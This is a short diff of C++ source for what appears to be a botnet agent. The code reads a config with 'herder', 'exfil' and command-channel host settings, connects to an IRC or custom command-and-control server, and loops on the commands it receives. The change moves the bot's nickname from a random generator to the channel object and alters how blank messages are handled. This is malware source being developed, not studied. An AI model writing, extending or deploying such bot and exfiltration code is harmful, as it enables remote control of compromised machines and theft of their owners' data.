@@ -1,6 +1,5 @@
 #include "Environment.hpp"
 #include "SecureSocket.hpp"
-#include "Random.hpp"
 #include "Utils.hpp"
 #include "SystemInfo.hpp"
 #include "DataLoader.hpp"
@@ -36,15 +35,12 @@ void MainThread(unsigned int parentThreadId)
     ifstream configFile(configPath, ios::in);
     configFile >> config;
 
-    RandomGenerator rng;
-
     string type = config["type"];
     string host = config["host"];
     string port = config["port"];
     string channel = config["channel"];
     string herder = config["herder"];
     string exfil = config["exfil"];
-    string nick = rng.GetString(Legit::ALPHA_MIXED, 1) + rng.GetString(Legit::ALPHA_NUMERIC_MIXED, 15);
 
     auto exfilUrlParts = HttpUtils::SplitUrl(exfil);
     string exfilScheme = exfilUrlParts[0];
@@ -64,16 +60,17 @@ void MainThread(unsigned int parentThreadId)
 
     unique_ptr<ICommandChannel> cc = nullptr;
     if (type == "irc")
-        cc = make_unique<IrcCommandChannel>(host, port, channel, nick, herder, cert);
+        cc = make_unique<IrcCommandChannel>(host, port, channel, herder, cert);
     else if (type == "custom")
-        cc = make_unique<CustomCommandChannel>(host, port, nick, cert);
+        cc = make_unique<CustomCommandChannel>(host, port, cert);
 
+    string nick = cc->GetName();
     cout << "Done" << endl;
 
     while (true)
     {
         auto message = cc->Receive();
-        if (message == "quit" || message == "") // blank messages mean error. Need to fix that, really :/
+        if (message == "quit")
         {
             #ifdef _WIN32
             ::PostThreadMessage(parentThreadId, WM_QUIT, 0, 0);
